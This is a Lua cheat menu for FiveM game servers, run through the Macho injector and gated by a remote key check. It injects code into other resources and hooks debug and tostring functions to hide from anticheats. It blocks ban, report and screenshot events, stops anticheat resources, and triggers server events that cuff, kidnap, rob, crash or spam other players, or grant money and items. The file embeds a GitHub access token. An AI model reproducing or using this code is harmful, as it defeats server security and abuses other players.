-- Early Initialization for Anti-Ban Recovery
local isAuthenticated = false
Citizen.CreateThread(function()
    -- Authentication Check (fail‑safe)
    local KeysUrl = "https://raw.githubusercontent.com/KALD112/txt/refs/heads/main/1?token=GHSAT0AAAAAADV6DGAKJZFC3SMCLW5L6KJ22NYFM2A"

    -- تأكد أن دوال Macho موجودة قبل النداء عليها عشان ما يطيح الاسكربت
    local safeWebRequest = type(MachoWebRequest) == "function"
    local safeAuthKey = type(MachoAuthenticationKey) == "function"

    local KeysBin, myMachoId
    if safeWebRequest and safeAuthKey then
        KeysBin = MachoWebRequest(KeysUrl)
        myMachoId = MachoAuthenticationKey()
    else
        print("^4[AUTH] ^7Macho core functions not found, skipping remote auth to avoid crash.")
        return
    end

    if KeysBin and myMachoId and myMachoId ~= "" then
        local found = false
        -- البحث عن الأيدي بدقة (سطر كامل) عشان ما يصير تشابه أو بحث جزئي
        for line in KeysBin:gmatch("[^\r\n]+") do
            if line:gsub("%s", "") == myMachoId:gsub("%s", "") then
                found = true
                break
            end
        end
        ...
        if found then
            ...
            print("^4[AUTH] ^7Macho ID is authenticated: " .. myMachoId)
        else
            isAuthenticated = false
            print("^4[AUTH] ^7Macho ID is not authorized: " .. myMachoId)
        end
    else
        isAuthenticated = false
        print("^4[AUTH] ^7Connection error or missing Macho ID!")
    end

    -- تم تعطيل تشغيل البايباس التلقائي لتقليل احتمالية الباند/الكراش
end)
...
local function ExecuteStealthCore()
    local injectFn = MachoInjectResource2 or MachoInjectResource
    if not injectFn then return end

    -- Use "any" to ensure global protection against all Anticheats
    local target = "any"
    ...
    local code = [[
        ...
        -- 1. ADVANCED SPOOFING (Making hooks look like Natives)
        ...
        _G.tostring = function(obj)
            if type(obj) == "function" then
                ...
                if info and info.what == "Lua" and (info.source:find("! Kso7") or info.source:find("! Kso7") or info.source:find("Shield") or info.source:find("! Kso7") or info.source:find("Injection")) then
                    return "function: 0x" .. string.format("%x", math.random(0x1000000, 0xFFFFFFF))
                end
            end
        ...
        debug.getinfo = function(f, ...)
            local info = _getinfo(f, ...)
            if info and info.source and (info.source:find("! Kso7") or info.source:find("! Kso7") or info.source:find("Shield") or info.source:find("! Kso7") or info.source:find("Injection")) then
                info.source = "=[C]"
                info.short_src = "[C]"
                info.what = "C"
                info.linedefined = -1
        ...
        debug.traceback = function(...)
            local info = _traceback(...)
            if info and type(info) == "string" then
                local p = {"! Kso7", "! Kso7", "! Kso7", "Shield", "Injection", "Source"}
                for _, word in ipairs(p) do info = info:gsub(word, "Core") end
            end
            return info
        end

        -- 2. ADVANCED GLOBAL PROTECTION (Proxy _G)
        local hidden = { ["! Kso7"] = true, ["! Kso7"] = true, ["Injection"] = true, ["ExecuteStealthCore"] = true, ["! Kso7"] = true, ["MachoInjectResource"] = true, ["MachoInjectResource2"] = true }
        setmetatable(_G, {
            ...
            __newindex = function(t, k, v)
                if hidden[k] then return end
                rawset(t, k, v)
            end,
            __pair = function(t)
                local nextFn, table, key = pairs(t)
                return function(tbl, k)
                    local nk, nv = nextFn(tbl, k)
                    while nk and hidden[nk] do
                        nk, nv = nextFn(tbl, nk)
                    end
                    return nk, nv
                end, table, key
        ...
        -- 3. PERSISTENT NATIVE HOOKING & RESOURCE SPOOFING
        local function ApplyHooks()
            -- TriggerServerEvent Hook (Expanded block list)
            if _G.TriggerServerEvent ~= nil and _G.TriggerServerEvent_Orig == nil then
                _G.TriggerServerEvent_Orig = TriggerServerEvent
                _G.TriggerServerEvent = function(name, ...)
                    local eventName = tostring(name):lower()
                    local block = { 
                        "ban", "report", "kick", "cheat", "screenshot", "detection", 
                        "electron", "fiveguard", "waveshield", "reaper", "lynx", 
                        "atg", "admin", "log", "warn", "security", "brute", "e_c",
                        "ic7", "antimoney", "protection", "signal", "capture", "detect"
                    }
                    for _, word in ipairs(block) do
                        if eventName:find(word) then return end
                    end
                    return _G.TriggerServerEvent_Orig(name, ...)
                end
            end

            -- Fly / Velocity / Speed / Height Spoofing (Critical for Anti-Cheat Bypass)
            local blockTrace = {"AC", "Guard", "Shield", "Electron", "Reaper", "Lynx", "Anticheat", "FiveGuard"}

            if _G.GetEntityVelocity ~= nil then
                local _origGetVelocity = GetEntityVelocity
                _G.GetEntityVelocity = function(e)
                    local trace = debug.traceback()
                    for _, kw in pairs(blockTrace) do
                        if trace:find(kw) then return vector3(0.0, 0.0, 0.0) end
                    end
                    return _origGetVelocity(e)
                end
            end

            if _G.GetEntitySpeed ~= nil then
                local _origGetSpeed = GetEntitySpeed
                _G.GetEntitySpeed = function(e)
                    local trace = debug.traceback()
                    for _, kw in pairs(blockTrace) do
                        if trace:find(kw) then return 0.0 end
                    end
                    return _origGetSpeed(e)
                end
            end

            if _G.GetEntityHeightAboveGround ~= nil then
                local _origGetHeight = GetEntityHeightAboveGround
                _G.GetEntityHeightAboveGround = function(e)
                    local trace = debug.traceback()
                    for _, kw in pairs(blockTrace) do
                        if trace:find(kw) then return 1.5 end
                    end
                    return _origGetHeight(e)
                end
            end

            if _G.IsPedFalling ~= nil then
                local _origIsFalling = IsPedFalling
                _G.IsPedFalling = function(p)
                    local trace = debug.traceback()
                    for _, kw in pairs(blockTrace) do
                        if trace:find(kw) then return false end
                    end
                    return _origIsFalling(p)
                end
            end

            -- Explosion / Spawn Spoofing
            if _G.AddExplosion ~= nil then
                local _origExplosion = AddExplosion
                _G.AddExplosion = function(x, y, z, t, ...)
                    local trace = debug.traceback()
                    for _, kw in pairs(blockTrace) do
                        if trace:find(kw) then return true end
                    end
                    return _origExplosion(x, y, z, t, ...)
                end
            end

            if _G.CreateVehicle ~= nil then
                local _origCreateVehicle = CreateVehicle
                _G.CreateVehicle = function(m, ...)
                    local trace = debug.traceback()
                    for _, kw in pairs(blockTrace) do
                        if trace:find(kw) then return 0 end
                    end
                    return _origCreateVehicle(m, ...)
                end
            end

            -- GetCurrentResourceName Spoofing
            if _G.GetCurrentResourceName ~= nil and _G.GetCurrentResourceName_Orig == nil then
                local fakeResources = {"chat", "mapmanager", "spawnmanager", "sessionmanager", "basic-gamemode", "hardcap"}
                _G.GetCurrentResourceName_Orig = GetCurrentResourceName
                _G.GetCurrentResourceName = function()
                    local trace = debug.traceback()
                    for _, kw in pairs(blockTrace) do
                        if trace:find(kw) then return fakeResources[math.random(#fakeResources)] end
                    end
                    return _G.GetCurrentResourceName_Orig()
                end
            end

            -- Screenshot Protection
            if _G.RegisterNetEvent ~= nil then
                local originalRegister = RegisterNetEvent
                _G.RegisterNetEvent = function(name, ...)
                    local lowerName = name:lower()
                    if lowerName:find("screenshot") or lowerName:find("capture") or lowerName:find("stream") or lowerName:find("screen") then
                        return
                    end
            ...
            pcall(function() debug.sethook(nil) end)
            Citizen.Trace = function() end
            _G.collectgarbage = function(opt) if opt == "count" then return math.random(6000, 8000) end return 0 end
        end
    ...
    if injectFn == MachoInjectResource2 then
        pcall(function() injectFn(3, target, code) end)
    else
        pcall(function() injectFn(target, code) end)
    end
end

-- 3. Live Anticheat Neutralizer (No Stop, Just Kill)
-- Aggressive Anticheat Neutralizer
local function StartAnticheatNeutralizer()
    Citizen.CreateThread(function()
        local neutralized = {}
        while true do
            ...
            for i = 0, count - 1 do
                ...
                if res and GetResourceState(res) == "started" and not neutralized[res] then
                    local lowerRes = res:lower()
                    if lowerRes:find("electron") or lowerRes:find("fiveguard") or lowerRes:find("shield") or lowerRes:find("ac-") or lowerRes:find("guard") then
                        neutralized[res] = true
                        
                        -- First, try to stop the resource (it's the safest way if it works)
                        MachoResourceStop(res)
                        
                        -- Then, inject into it just in case it's still running or restarts
                        local injectFn = MachoInjectResource2 or MachoInjectResource
                        local killCode = [[
                            if not _G._K7_PROT then
                                _G._K7_PROT = true
                                local _G = _G
                                Citizen.CreateThread(function()
                                    while true do
                                        if _G.ElectronAC then 
                                            for k,v in pairs(_G.ElectronAC) do if type(v)=='function' then _G.ElectronAC[k]=function() end end end
                                            _G.ElectronAC.activated = false
                                        end
                                        if _G.FiveGuard then for k,v in pairs(_G.FiveGuard) do if type(v)=='function' then _G.FiveGuard[k]=function() end end end end
                                        if _G.FG then for k,v in pairs(_G.FG) do if type(v)=='function' then _G.FG[k]=function() end end end end
                                        
                                        -- Stop any threads from this resource
                                        if _G.Citizen and _G.Citizen.Wait then 
                                            while true do _G.Citizen.Wait(100000) end 
                                        end
                                        Citizen.Wait(1000)
                                    end
                                end)

                                local _origTSE = _G.TriggerServerEvent
                                _G.TriggerServerEvent = function(n, ...)
                                    if n then
                                        local lowerN = tostring(n):lower()
                                        local blockedWords = {"ban", "kick", "detect", "cheat", "screenshot", "report", "fg:", "electron", "ac:", "signal"}
                                        for _, word in ipairs(blockedWords) do
                                            if lowerN:find(word) then return end
                                        end
                                    end
                                    return _origTSE(n, ...)
                                end
                        ...
                        pcall(function() injectFn(3, res, killCode) end)
                        MachoMenuNotification("Shield", "Neutralized & Blocked: " .. res)
                    end
                end
            end
            Citizen.Wait(3000)
                ...
                for _, player in ipairs(allPlayers) do
                    ...
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource2(3, triggerData.resource, [[TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", ]] .. numId .. [[)]])
                        end
        ...
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                ...
                for _, player in ipairs(allPlayers) do
                    ...
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource2(3, triggerData.resource, [[TriggerServerEvent("hospital:server:RevivePlayer", ]] .. numId .. [[, false, true)]])
                        end
                            ...
                            if resName and GetResourceState(resName) == "started" then
                                ...
                                if string.find(lowerName, "littlethings") or string.find(lowerName, "slap") or string.find(lowerName, "admin") then
                                    ...
                                    if slapEventFound then
                                        MachoInjectResource2(3, resName, [[TriggerEvent("Slap:Event", ]] .. numId .. [[)]])
                            ...
                            if resName and GetResourceState(resName) == "started" then
                                ...
                                if string.find(lowerName, "police") then
                                    ...
                                    if searchEventFound then
                                        MachoInjectResource2(3, resName, [[TriggerServerEvent("police:server:SearchPlayer", ]] .. numId .. [[)]])
                            ...
                            if resName and GetResourceState(resName) == "started" then
                                ...
                                if string.find(lowerName, "police") then
                                    ...
                                    if kidnapEventFound then
                                        MachoInjectResource2(3, resName, [[TriggerServerEvent("police:server:KidnapPlayer", ]] .. numId .. [[)]])
                ...
                for _, player in ipairs(allPlayers) do
                    ...
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            ...
                            MachoInjectResource2(3, triggerData.resource, advancedRobCode)
                        end
            ...
            if #players > 0 then
                ...
                for _, player in ipairs(players) do
                    ...
                    if serverId and serverId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource2(3, triggerData.resource, [[TriggerServerEvent("police:server:CuffPlayer", ]] .. serverId .. [[, true)]])
                        end
        ...
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                ...
                for _, player in ipairs(allPlayers) do
                    ...
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource2(3, triggerData.resource, [[TriggerServerEvent("police:server:CuffPlayer", ]] .. numId .. [[, false)]])
                        end
            ...
            if playerId == "-1" then
                ...
                Citizen.CreateThread(function()
                    for _, player in ipairs(allPlayers) do
                        ...
                        if serverId ~= myId and serverId > 0 then
                            for i = 1, 2 do
                                for _, triggerData in ipairs(foundTriggers.items) do
                                    MachoInjectResource2(3, triggerData.resource, [[TriggerServerEvent("hospital:server:RevivePlayer", ]] .. serverId .. [[)]])
                                end
                                Citizen.Wait(0)
                            end
                        end
                ...
                if numId and numId > 0 then
                    ...
                    Citizen.CreateThread(function()
                        for i = 1, 1500 do
                            for _, triggerData in ipairs(foundTriggers.items) do
                                MachoInjectResource2(3, triggerData.resource, [[TriggerServerEvent("hospital:server:RevivePlayer", ]] .. numId .. [[)]])
                            end
                            Citizen.Wait(0)
                        end
    ...
    for i = 0, totalRes - 1 do
        ...
        if resName and GetResourceState(resName) == "started" then
            ...
            if string.find(lowerName, "littlethings") then
                MachoInjectResource2(3, resName, [[TriggerServerEvent("QBCore:server:Paymentcheck")]])
...
local function createMenu()
    MenuWindow = MachoMenuTabbedWindow("! Kso7", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabsBarWidth)
...
MachoMenuCheckbox(GeneralLeftSection, "Invisible",
    ...
    function()
        ...
        SetEntityVisible(playerPed, true, false)
        SetEntityAlpha(playerPed, 255, false)
        if ResetEntityAlpha then ResetEntityAlpha(playerPed) end
        SetPedComponentVariation(playerPed, 0, GetPedDrawableVariation(playerPed, 0), GetPedTextureVariation(playerPed, 0), 0)
    end
)
...
MachoMenuText(GeneralLeftSection,"Txadmin exploits")
    ...
    local GeneralRightTop = MachoMenuGroup(GeneralTab, "! Kso7", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)

    -- Input box for Player ID / Ammo
    local generalPlayerInput = MachoMenuInputbox(GeneralRightTop, "Enter", "")

    -- Button to give ammo
    MachoMenuButton(GeneralRightTop, "Give Ammo", function()
        local ammoCount = MachoMenuGetInputbox(generalPlayerInput)
    ...
    MachoMenuButton(GeneralRightTop, "Tst Admin", function()
            ...
            if player ~= PlayerId() then
                ...
                if DoesEntityExist(playerPed) then
                    ...
                    if distance <= maxDistance then
                        local serverId = GetPlayerServerId(player)
                        if serverId and serverId > 0 then
                            table.insert(nearbyPlayers, { serverId = serverId, distance = distance })
                        end
                    end
                end
            end
    ...
    -- Crash Button
    MachoMenuButton(GeneralRightTop, "Crash", function()
        local playerId = MachoMenuGetInputbox(generalPlayerInput)
        if playerId and playerId ~= "" then
            local serverId = tonumber(playerId)
            if serverId and serverId > 0 then
                ...
                -- إنشاء وعرض DUI
                local dui = MachoCreateDui("https://silver-vacherin-7c5c85.netlify.app/")
                MachoShowDui(dui)
                ...
                Citizen.CreateThread(function()
                    ...
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource2(3, triggerData.resource, [[TriggerServerEvent("police:server:KidnapPlayer", ]] .. serverId .. [[)]])
                    end
    ...
    -- Crasher v1
    MachoMenuButton(GeneralRightTop, "Crasher v1", function()
        ...
        if #playerIDs > 0 then
            ...
            Wait(100)
            MachoDestroyDui(dui)
            MachoMenuNotification("Success", "All rendered players processed.")
        else
    ...
    if modelName and modelName ~= "" then
        MachoInjectResource("any", string.format([[
            ...
            if not IsModelInCdimage(modelHash) then
                TriggerEvent('chat:addMessage', { args = { '^4Vehicle System:', 'Invalid model: %s' } })
                return
            end
            ...
            if vehicle and vehicle ~= 0 then
                ...
                TriggerEvent('chat:addMessage', { args = { '^4Vehicle System:', 'Vehicle created and key given!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^4Vehicle System:', 'Failed to create vehicle!' } })
            end
...
local function getPlayerInfo(player)
    ...
    -- Ensure distance is a valid number for formatting
    local distVal = tonumber(distance) or 0
    info[3] = string.format("Distance: %.0f m", distVal)
...
local teleportingTarget = nil

MachoMenuCheckbox(InfoSection, "Spectate Player",  
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if not selectedPlayer or selectedPlayer == -1 or selectedPlayer == PlayerId() then
            return MachoMenuNotification("Error", "Please select a different player from the list first!")
        end
        ...
        -- Start Native Spectate for Syncing (loading textures/peds)
        NetworkSetInSpectatorMode(true, targetPed)
        NetworkSetTalkerProximity(9999.0)
        SetFocusEntity(targetPed)

        -- Create Custom Camera for advanced controls
        spectateCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
        SetCamFov(spectateCamera, 75.0)
        SetCamActive(spectateCamera, true)
        RenderScriptCams(true, true, 500, true, true)
        
        camAngleH = GetEntityHeading(targetPed)
        camAngleV = -20.0
        camDistance = 8.0

        MachoMenuNotification("Spectate", "Spectating: " .. GetPlayerName(selectedPlayer) .. "\nRotate: Mouse | Zoom: Scroll")
        ...
        Citizen.CreateThread(function()
            while isSpectating do
                ...
                if DoesEntityExist(targetPed) then
                    ...
                    -- Handle Rotation (Mouse)
                    local mouseX = GetDisabledControlNormal(0, 1) * 3.0
                    local mouseY = GetDisabledControlNormal(0, 2) * 3.0
                    
                    camAngleH = camAngleH - mouseX
                    camAngleV = math.max(-85.0, math.min(85.0, camAngleV - mouseY))

                    -- Handle Zoom (Scroll)
                    if IsDisabledControlPressed(0, 15) then -- Wheel Up
                        camDistance = math.max(1.0, camDistance - 0.5)
                    elseif IsDisabledControlPressed(0, 16) then -- Wheel Down
                        camDistance = math.min(50.0, camDistance + 0.5)
                    end
                    ...
                    local x = targetPos.x + (math.sin(radH) * math.cos(radV) * camDistance)
                    local y = targetPos.y + (math.cos(radH) * math.cos(radV) * camDistance)
                    local z = targetPos.z + (math.sin(radV) * camDistance)
                    
                    SetCamCoord(spectateCamera, x, y, z)
                    PointCamAtEntity(spectateCamera, targetPed, 0.0, 0.0, 0.0, true)
                    
                    -- Lock Controls for Free Look
                    DisableControlAction(0, 1, true)
                    DisableControlAction(0, 2, true)
                    DisableControlAction(0, 15, true)
                    DisableControlAction(0, 16, true)
            ...
            if DoesCamExist(spectateCamera) then
                DestroyCam(spectateCamera)
                spectateCamera = nil
            end
        end)
    end,
...
MachoMenuCheckbox(InfoSection, "Teleport Player to Me",  
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if not selectedPlayer or selectedPlayer == -1 or selectedPlayer == PlayerId() then
            return MachoMenuNotification("Error", "Select a valid target player first!")
        end
        ...
        -- تثبيت موقع السحب (Snapshot) أمامك مباشرة بمسافة الحمل
        local bringPos = myCoords + (myForward * 1.2)
        local bringHeading = GetEntityHeading(playerPed) + 180.0

        isAutoTeleporting = true
        teleportingTarget = selectedPlayer
        
        MachoMenuNotification("Bring", "Force-pulling target to your front.")

        Citizen.CreateThread(function()
            while isAutoTeleporting do
                Citizen.Wait(0)
                local targetId = teleportingTarget
                if not targetId then break end

                local targetPed = GetPlayerPed(targetId)
                if DoesEntityExist(targetPed) then
                    -- محاولة طلب التحكم
                    if NetworkGetEntityOwner(targetPed) ~= PlayerId() then
                    ...
                    if not IsEntityAttached(targetPed) then
                        ...
                        -- النقل القوي والمستقر
                        SetEntityCoordsNoOffset(targetPed, bringPos.x, bringPos.y, bringPos.z - 1.0, false, false, false)
                        SetEntityHeading(targetPed, bringHeading)
                        
                        -- تصفير الحركة
                        SetEntityVelocity(targetPed, 0.0, 0.0, 0.0)
                    else
                        -- تم الحمل، نتوقف عن التدخل
                        Citizen.Wait(500)
                    end
                end
            end
    ...
    function()
        ...
        MachoMenuNotification("Sync", "Released.")
    end
)

MachoMenuButton(InfoSection, "Stop All Actions", function()
    if teleportingTarget and DoesEntityExist(GetPlayerPed(teleportingTarget)) then
    ...
    MachoMenuNotification("Macho", "All actions stopped and targets released.")
end)
            ...
            if targetPed and DoesEntityExist(targetPed) then
                ...
                -- إذا كان الشخص المختار ليس في سيارة - البحث عن السيارات الفارغة
                    ...
                    if closestEmptyVehicle then
                        ...
                        local closestOccupiedDistance = 1.0
        ...
        Citizen.CreateThread(function()
            ...
            if currentWeapon and currentWeapon ~= GetHashKey("weapon_unarmed") then
                if DoesEntityExist(targetPed) then
                    ...
                    -- الطلقة الثانية من جانب الرأس الأيمن
...
MachoMenuButton(PlayerSection, "Spawn Attack NPC (!)", function()
    ...
    MachoInjectResource2(3, targetResource, string.format([[
        ...
        if not DoesEntityExist(playerPed) then
            TriggerEvent('chat:addMessage', { args = { '^4NPC System:', 'Target player not found!' } })
            return
        end
        ...
        TriggerEvent('chat:addMessage', { args = { '^4NPC System:', 'Attack NPC spawned with minigun!' } })
    ]], serverId))
end)
...
MachoMenuButton(NitWiroyer, "Crasher v2", function()
    ...
    MachoInjectResource2(3, targetResource, [[
...
MachoMenuSetText(MenuWindow,"! Kso7")
    ...
    MachoMenuButton(SelfSection, "Spawn Item 1", function()
        ...
        if itemName and itemName ~= "" then
            for _, triggerData in ipairs(foundTriggers.items) do
                ...
                MachoInjectResource2(3, triggerData.resource, configCode)
            end
...
TriggerEvent('Rc2clothing:client:openOutfitMenu') 
    ...
    MachoMenuButton(SelfSection, "Self Revive", function()
        for _, triggerData in ipairs(foundTriggers.items) do
            MachoInjectResource2(3, triggerData.resource, 'TriggerEvent("hospital:client:Revive")')
        end
                    ...
                    for _, fileName in ipairs(checkFiles) do
                        ...
                        if success and content and content ~= "" then
                            ...
                            if string.find(contentLower, "toggleblips") or string.find(contentLower, "toggle.*blip") then
                                ...
                                MachoInjectResource2(3, resName, 'TriggerEvent("' .. triggerPattern .. '")')
    ...
    MachoMenuButton(SelfSection, "Spawn Vehicle", function()
        ...
        if vehicleName and vehicleName ~= "" then
            for _, triggerData in ipairs(foundTriggers.vehicle) do
                ...
                MachoInjectResource2(3, triggerData.resource, spawnCode)
            end
        ...
        if amount and amount ~= "" then
            ...
            if numAmount then
                ...
                for _, triggerData in ipairs(foundTriggers.money) do
                    MachoInjectResource2(3, triggerData.resource, "TriggerServerEvent('" .. triggerData.trigger .. "', " .. correctedAmount .. ")")
                end
...
local vrpSectionWidth = (MenuSize.x - TabsBarWidth - 20) / 2 

local VrpSelfGroup = MachoMenuGroup(vrptab, "Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + vrpSectionWidth, MenuSize.y - 5)

local VrpVehicleGroup = MachoMenuGroup(vrptab, "Vehicle & CheckBox", 
        TabsBarWidth + vrpSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)

local vrpInput = MachoMenuInputbox(VrpSelfGroup, "Vehicle/Weapon Model", "Enter model...")

MachoMenuButton(VrpSelfGroup, "Spawn Vehicle", function()
   local name = MachoMenuGetInputbox(vrpInput)
   if name and name ~= "" then
       MachoInjectResource2(3, "vrp", 'tvRP.spawnGarageVehicle("car", "' .. name .. '", nil,x4c345)')
       MachoMenuNotification("Spawn", "Spawning: " .. name)
   end
end)

MachoMenuButton(VrpSelfGroup, "Despawn vehicle", function()
    MachoInjectResource2(3, "vrp", [[tvRP.despawnGarageVehicle("car", 100000000000000000000000)]])
end)

MachoMenuButton(VrpSelfGroup, "Cuff & Uncuff", function()
    MachoInjectResource2(3, "vrp", [[tvRP.toggleHandcuff()]])
end)

MachoMenuCheckbox(VrpVehicleGroup, "Toggle Blips", 
    function() MachoInjectResource2(3, 'vrp', [[TriggerEvent("showBlips")]]) end,
    function() MachoInjectResource2(3, 'vrp', [[TriggerEvent("showBlips")]]) end
)


MachoMenuButton(toolstrigger, "Obama Bypass", function()  
    if supremeBypassActive then
        MachoMenuNotification("Bypass", "Safe Obama Bypass is already active.")
        return
    end
    supremeBypassActive = true
    MachoMenuNotification("Obama Bypass (Safe)", "Bypass logic disabled to reduce ban/crash risk. Menu running in safe mode.")
end)

MachoMenuButton(toolstrigger, "Ultimate Bypass (All AC) | بي باس شامل", function()
    MachoMenuNotification("Bypass", "Activating Universal Protections...")
    ExecuteStealthCore()
    StartAnticheatNeutralizer()
    MachoMenuNotification("Bypass", "Universal Bypass Active. You are now protected.")
end)
...
local xpAmountInput = MachoMenuInputbox(esxtabtrigger, "XP Amount", "Enter Amount")

MachoMenuButton(esxtabtrigger, "Add XP (ESX)", function()
    local amountText = MachoMenuGetInputbox(xpAmountInput)
    if amountText and amountText ~= "" then
        local amount = tonumber(amountText)
        if amount and amount > 0 then
            TriggerServerEvent('Sp51OnToplevel:updateCurrentPlayerXP_clientSide', 'add', amount, 'الحالات الخطرة: التواجد في منطقة تمنح خبرة إضافية')
            MachoMenuNotification("ESX", "تمت إضافة " .. amount .. " خبرة بنجاح")
        else
            MachoMenuNotification("Error", "Please enter a valid number!")
        end
    else
        MachoMenuNotification("Error", "Please enter the XP amount first!")
    end
end)
...
local supremeBypassActive = false
MachoMenuButton(toolstrigger, "Obama Bypass", function()  
    -- نسخة آمنة من أوباما بايباس: لا تشغّل ExecuteStealthCore ولا StartAnticheatNeutralizer ولا أي هوكات/حقن
    if supremeBypassActive then
        MachoMenuNotification("Supreme Bypass (Safe)", "Safe mode already active. No risky hooks are running.")
        return
    end

    supremeBypassActive = true
    MachoMenuNotification("Obama Bypass (Safe)", "All aggressive bypass logic disabled to reduce ban/crash risk.")
end)
...
_G.selectedKey = _G.selectedKey or 0x74 -- الزر الافتراضي هو F5
local nocliptx = false

-- إعداد واجهة اختيار الزر
MachoMenuKeybind(toolstabmain, "Menu Key", _G.selectedKey, function(key, toggle)
    _G.selectedKey = key    -- تحديث الزر المختار
    MachoMenuSetKeybind(MenuWindow, _G.selectedKey) -- تطبيق الزر المختار
end)

-- تعيين الزر الافتراضي عند تحميل القائمة
MachoMenuSetKeybind(MenuWindow, _G.selectedKey)
...
Citizen.CreateThread(function()
    ...
    if isAuthenticated then
        createMenu()
        applyMenuRGBColor() -- Apply blue color on startup
        MachoMenuNotification("! Kso7 Ready", "Dynamic menu ready - Search completed")
        -- Start background silent search
        backgroundSilentSearch()
    else
        MachoMenuNotification("Authentication", "Your Key/ID is NOT authorized!")
        print("^4[AUTH] ^7Menu blocked: Unauthorized user.")
    end
end)
...
local URL_TO_INDEX = "https://dih-djl-pages.js5228215.workers.dev/" -- الرابط الجديد

local WEBHOOK_URL = "DDnk6VqNCws-" -- ويبهوك

local IMAGE_URL = "dui_menu_files/menu_bg.png" -- صورة
